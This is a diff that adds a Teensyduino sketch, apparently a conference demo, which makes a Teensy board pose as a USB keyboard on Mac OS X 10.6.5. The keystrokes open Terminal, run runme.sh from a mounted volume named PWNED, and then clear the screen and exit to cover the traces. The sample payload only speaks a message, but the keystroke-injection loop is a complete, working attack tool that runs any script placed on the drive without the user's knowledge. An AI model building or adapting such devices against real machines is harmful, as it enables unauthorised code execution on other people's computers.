@@ -1,0 +1,62 @@
+// Sketch for teensyduino to get into a shell on OS-X 10.6.5
+// Improved at 27c3 as Spotlight was a bad way of doing it. This
+// version is more reliable, setup teensy with USB drive + keyboard
+// Example of disk in project sketch dir.
+//
+// fantastics-macbook:disk fantastic$ cat .VolumeLabel 
+// pwned
+// fantastics-macbook:disk fantastic$ cat runme.sh 
+// #!/bin/sh
+// /usr/bin/say "you got owned"
+// fantastics-macbook:disk fantastic$ pwd
+// /Users/fantastic/Documents/Arduino/teensykeyboard/disk
+
+void setup() { } // no setup needed
+
+void loop() {
+  delay(1000);
+  Keyboard.set_modifier(MODIFIERKEY_ALT | MODIFIERKEY_GUI);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_SPACE);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(100);
+  Keyboard.set_modifier(MODIFIERKEY_SHIFT | MODIFIERKEY_GUI);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_G);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(100);
+  Keyboard.println("/Applications/Utilities");
+  delay(1000);
+  Keyboard.set_key1(KEY_T);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();   
+  delay(500);
+  Keyboard.set_modifier(MODIFIERKEY_GUI);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_O);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(1000);
+  Keyboard.set_modifier(MODIFIERKEY_GUI);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_N);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(1000);
+  Keyboard.println("cd /Volumes/PWNED");
+  Keyboard.println("sh ./runme.sh");
+  Keyboard.println("clear;exit");
+  delay(30000);
+}
+
